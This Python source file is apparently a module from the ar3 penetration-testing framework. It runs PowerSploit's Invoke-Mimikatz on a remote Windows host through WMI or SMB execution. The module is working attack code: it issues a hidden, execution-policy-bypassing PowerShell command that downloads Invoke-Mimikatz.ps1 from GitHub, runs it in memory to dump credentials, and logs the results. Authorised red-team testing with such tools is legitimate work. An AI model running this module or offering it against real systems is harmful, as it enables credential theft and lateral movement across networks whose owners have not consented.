from ar3.core.wmiexec import WMIEXEC
from ar3.core.smbexec import SMBEXEC

class InvokeMimikatz():
    def __init__(self):
        self.name = 'invoke-mimikatz'
        self.description = 'Execute PowerSpoits Invoke-Mimikatz.ps1'
        self.author = ['@m8r0wn']
        self.args = {}

    def run(self, target, args, smb_con, loggers):
        logger = loggers['console']
        try:
            if args.exec_method == 'wmiexec':
                executioner = WMIEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)
            elif args.exec_method == 'smbexec':
                executioner = SMBEXEC(logger, target, args, smb_con, share_name=args.fileless_sharename)

            for result in executioner.execute('powershell -exec bypass -noni -nop -W hidden -C "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1\');"').splitlines():
                logger.info([smb_con.host, smb_con.ip, self.name.upper(), result])

        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))